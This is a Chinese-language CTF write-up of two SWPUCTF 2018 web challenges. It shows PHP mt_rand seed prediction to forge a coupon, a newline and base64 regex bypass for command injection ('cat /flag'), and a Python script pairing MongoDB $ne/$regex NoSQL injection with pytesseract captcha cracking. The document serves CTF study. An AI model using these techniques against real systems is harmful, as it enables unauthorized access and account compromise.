---
title: SWPUCTF 2018 部分Web write up
date: 2018-12-23 10:17:17
tags:
    - web安全
    - CTF
---


## 用优惠劵买个X?


登录后给了一个优惠券，存在cookie的Auth里  
![](/img/swpu/1.png)  

在购买界面输入该优惠券返回说需要24位的优惠券。  
扫描目标站点发现有www.zip,下载打开发现source.php

```
<?php
//生成优惠码
$_SESSION['seed']=rand(0,999999999);
function youhuima(){
    mt_srand($_SESSION['seed']);
    $str_rand = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $auth='';
    $len=15;
    for ( $i = 0; $i < $len; $i++ ){
        if($i<=($len/2))
              $auth.=substr($str_rand,mt_rand(0, strlen($str_rand) - 1), 1);
        else
              $auth.=substr($str_rand,(mt_rand(0, strlen($str_rand) - 1))*-1, 1);
    }
    setcookie('Auth', $auth);
}
//support
    if (preg_match("/^\d+\.\d+\.\d+\.\d+$/im",$ip)){
        if (!preg_match("/\?|flag|}|cat|echo|\*/i",$ip)){
               //执行命令
        }else {
              //flag字段和某些字符被过滤!
        }
    }else{
             // 你的输入不正确!
    }
?>
```

判断需要利用PHP伪随机预测出24位的优惠码，利用了wonderkun的博客里介绍的方法和脚本。  
首先根据源码构造脚本如下，计算出每次的mt_rand()的值，并且按照工具php_mt_seed的参数要求打印。这里要注意的是，不同版本的PHP在执行mt_rand()会有不同，而根据网页的响应头得知服务器版本为7.2.9，因此在执行下面的脚本时也需要使用7.2版本的PHP。

```
<?php
$str="HNzlZc7wgMWEfWN";
$str_rand = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ";
for($i=0;$i<15;$i++){
  if($i<=(15/2)){
    $pos=strpos($str_rand,$str[$i]);  
    echo $pos." ".$pos." 0 ".(strlen($str_rand)-1)." ";
  }               
  else{
    $pos = strlen($str_rand)-strpos($randstr,$str[$i]);
    echo $pos." ".$pos." 0 ".(strlen($str_rand)-1);
  }
}
?>
```

接着使用php_mt_seed爆破出结果
![](/img/swpu/2.png)  

放入原脚本中，并且加入代码mt_srand(506450967),并把优惠券长度改为24位，即可得到24位的优惠券。

![](/img/swpu/3.png)  

输入会显示购买成功，然后就来到第二个页面，要求输入ip。观察源码，需要绕过两个正则，第一个正则有/m参数，即在每个换行符前后进行句首(^)句尾($)匹配，匹配成功一次即可返回正确，利用%0a可以绕过。第二个正则可以利用base64编码绕过。让服务器执行cat /flag即可  
![](/img/swpu/44.png)

## injection ???

测试sql注入不成功，在F12里看到有info.php，打开后是phpinfo，在里面看到开启了mongodb,猜测为NoSQL注入，测试?username[\$ne]=123&password[\$ne]=123发现成功注入，但是回显不是正确的密码，猜测需要注入得到正确的密码。利用[\$regex]配合^可以一位一位的得到正确的密码。该页面登录需要验证码，使用pytesseract库进行破解。构造脚本如下

```
import pytesseract
import requests,string
from PIL import Image
import time 
s=requests.session()
passwd=''
for  j  in range(30):
    for i in string.printable:
        while True:
            time.sleep(1)
            r=s.get('http://123.206.213.66:45678/vertify.php')
            with open('yzm.jpg','wb') as f:
                f.write(r.content)
            cap=pytesseract.image_to_string(Image.open('yzm.jpg'))
            url='http://123.206.213.66:45678/check.php?username[$ne]=123&password[$regex]=^{}&vertify={}'
            print(url.format(passwd+i,cap))
            r=s.get(url.format(passwd+i,cap))
            print(r.text)
            if not 'wrong' in r.text:
                break
        if 'Nice'  in r.text:
            passwd+=i
            print(passwd)
            break
```

即可得到正确的密码，登录即可getflag。






